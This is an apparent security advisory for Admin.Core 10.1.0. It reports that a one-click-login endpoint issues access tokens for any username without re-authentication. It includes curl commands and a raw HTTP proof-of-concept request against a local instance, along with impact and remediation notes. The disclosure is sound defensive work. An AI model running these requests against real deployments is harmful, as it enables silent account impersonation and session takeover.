# Admin.Core — One-click login issues tokens for arbitrary usernames (AC-VULN-006)

| Field | Value |
|-------|-------|
| Vendor | zhontai |
| Product | Admin.Core (中台Admin) |
| Version | 10.1.0 |
| Type | Improper Authorization |
| CWE | CWE-269 / CWE-284 |
| Authentication | Authenticated admin with api:admin:user:one-click-login permission |
| Severity | High |

## Summary

`UserService.OneClickLoginAsync(userName)` disables data filters and returns a full TokenInfo for any username without re-authentication or MFA.

## Root cause

Impersonation API issues JWT solely by username lookup.

## Exploit / reproduction

```bash
TOKEN=$(curl -s 'http://127.0.0.1:18010/api/admin/auth/login' -H 'Content-Type: application/json' \
  -d '{"userName":"admin","password":"123asd","accountType":1}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["data"]["accessToken"])')
curl -s 'http://127.0.0.1:18010/api/admin/user/one-click-login?userName=admin' -H "Authorization: Bearer $TOKEN"
```


## PoC (Yakit)

```http
GET /api/admin/user/one-click-login?userName=admin HTTP/1.1
Host: 127.0.0.1:18010
Authorization: Bearer ADMIN_TOKEN
Connection: close
```

Expected: HTTP 200; success=true; data.accessToken for target user

## Screenshots

See PoC HTTP response with accessToken (dynamic verify).

## Impact

Account impersonation; amplifies XSS/admin compromise into silent session takeover.

## Remediation

Require step-up auth/audit; restrict targets; short-lived impersonation tokens with clear claims.

## References

- Local report: `../POC_VERIFICATION_REPORT.md`
- Scripts: `poc_verify/admincore_poc_verify.py`, `admincore_jwt_forge.py`
- Upstream: https://github.com/zhontai/Admin.Core
